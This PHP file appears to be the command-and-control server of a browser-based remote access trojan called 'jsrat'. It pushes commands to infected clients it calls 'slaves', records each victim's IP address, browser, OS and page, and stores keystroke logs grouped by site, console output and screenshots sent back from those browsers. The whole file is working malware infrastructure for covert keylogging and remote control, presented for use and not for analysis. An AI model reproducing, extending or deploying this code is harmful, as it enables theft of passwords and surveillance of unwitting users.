<?php
header('Access-Control-Allow-Origin: *');
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate"); // HTTP/1.1
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past

//Iniciallize classes and stuff
include 'sys/head.php';
$uuid = (new jsrat)->uuid();

//Serve Commands to client
if(key($_GET) === 'recv') {

  //Check if there is an active command
  if($cmd = $db->table('cnc')->find('active', 'true', 1)->get()) {
    $cmd = $cmd[array_key_first($cmd)];
    $id = $cmd[array_key_first($cmd)];
    //Check if the command is still valid within the scope of its cool-down time
    $timer = time() - $cmd['timeIssued'];
    if( $timer > 31 ) {
      $db->table('cnc')->find('timeIssued', $cmd['timeIssued'], 1)->change('active', 'false');
			echo json_encode(array('status' => 'ok_null'));
      die();
    }

		//Check if this command is target specific or not
		if($cmd['target'] != 'x') {

			//If it's target specific, then lets check if this slave is a specified target
			if(!strpos($cmd['target'], $uuid)) {
				//Cleanup if slave is not a target
				echo json_encode(array('status' => 'ok_null'));
				die();
			}
		}

    //check if the slave has been reached yet or not
    if(!strpos($cmd['slavesReached'], $uuid)) {

      //Add slaves UUID to list of reached slaves
      $SR = "{$cmd['slavesReached']}{$uuid}:";
      $db->table('cnc')->find(
        'timeIssued', $cmd['timeIssued'], 1
      )->change('slavesReached', $SR);

      //Prepare and serve command data to slave
      $args = explode('|#:#|', $cmd['arguments']);
      $return = array('status' => 'ok_cmd','command' => $cmd['command']);
      $i = 1;
      foreach($args as $key => $val) {
        $return['argument'.$i] = $val;
				$i++;
      }
      echo json_encode($return);

      //list of commands we can delete imidiately after being reached to clear up wait time
      if($cmd['command'] === 'keylog' || $cmd['command'] === 'stopkeylog') {
        $db->table('cnc')->id($id)->delete();
      }
    }
		//Cleanup
		else {
			echo json_encode(array('status' => 'ok_null'));
		}
  }
	//Cleanup
	else {
		echo json_encode(array('status' => 'ok_null'));
	}
}

//Recieve Data From Client
elseif(key($_GET) === 'post') {

  //'hello' message is a slave checking in
  if($_GET['post'] === 'hello') {

    //check if we already have seen this slave
    if($slave = $db->table('slaves')->find('uuid', $uuid)->get()) {
      $slave = $slave[array_key_first($slave)];
				if( $db->table('slaves')->find('uuid', $uuid, 1)->change('lastSeen', time()) &&
				$db->table('slaves')->find('uuid', $uuid, 1)->change('page', $_POST['ref'])) {
					$status = 'ok_update';
					$keylogger = $slave['keylog'];
				} else {
					$status = 'error_update';
					$keylogger = 'null';
				}
				echo json_encode(array('status' => $status, 'log' => $keylogger));
      	die();
    }

    //If not, lets add the slave to our list
    else {
      $status = ($db->table('slaves')->put(array(
        'ip'          => (new jsrat)->getIP(),
        'lastSeen'    => time(),
        'firstSeen'   => time(),
        'ua'          => (new jsrat)->getUA(),
        'os'          => (new jsrat)->getOS(),
        'uuid'        => $uuid,
        'page'        => ((empty($_POST['ref']))?$_SERVER["HTTP_REFERER"]:$_POST['ref']),
				'keylog'			=> "false"
      )))?'ok_new':'error_new';
			echo json_encode(array('status' => $status, 'log' => 'false'));
      die();
    }
  } elseif($_GET['post'] == 'klog') {
		$log = $_POST['log'];
		$ref = (!empty($_POST['ref']))?$_POST['ref']:''; //currentRef
		if($row = $db->table('keylogs')->find('uuid', $uuid, 1)->get()) {
			$row = $row[array_key_first($row)];
			if($row['currentRef'] == $ref || $ref == '') {
				$db->table('keylogs')->find('uuid', $uuid)->change('log', $row['log'].$log);
			} else {
				$db->table('keylogs')->find('uuid', $uuid)->change('log', "{$row['log']}\n\n[SITE: {$ref}]\n{$log}");
				$db->table('keylogs')->find('uuid', $uuid)->change('currentRef', $ref);
			}
			$status = 'kl_update';
		} else {
			$slave = $db->table('slaves')->find('uuid', $uuid,1)->get();
			$slave = $slave[array_key_first($slave)];
			$db->table('keylogs')->put(array(
			  'uuid'        => $uuid,
			  'log'         => "[Keylog Started]>\n\n[SITE: {$slave['page']}]\n{$log}",
				'currentRef'  => $slave['page']
			));
			$status = 'kl_new';
		}
		echo json_encode(array('status' => $status));
	} elseif($_GET['post'] == 'console' && isset($_POST['cmd'])) {
		$output = (empty($_POST['log']))?'undefined':base64_decode($_POST['log']);
		$command = $_POST['cmd'];
		if($row = $db->table('console')->find('uuid', $uuid, 1)->get()) {
			$db->table('console')->find('uuid', $uuid)->change('log', $output);
			$status = 'console_update';
		} else {
			$db->table('console')->put(array(
			  'uuid'        => $uuid,
			  'log'         => $output
			));
			$status = 'console_new';
		}
		echo json_encode(array('status' => $status));
	} elseif($_GET['post'] == 'screenshot' && isset($_POST['img'])) {
		$db->table('screenshots')->put(array(
		  'uuid'    => $uuid,
		  'blob'  	=> $_POST['img']
		));
		echo json_encode(array('status' => 'img_store'));
	} else {
		echo json_encode(array('status' => 'ok_null'));
	}
} else {
	echo json_encode(array('status' => 'ok_null'));
}
?>
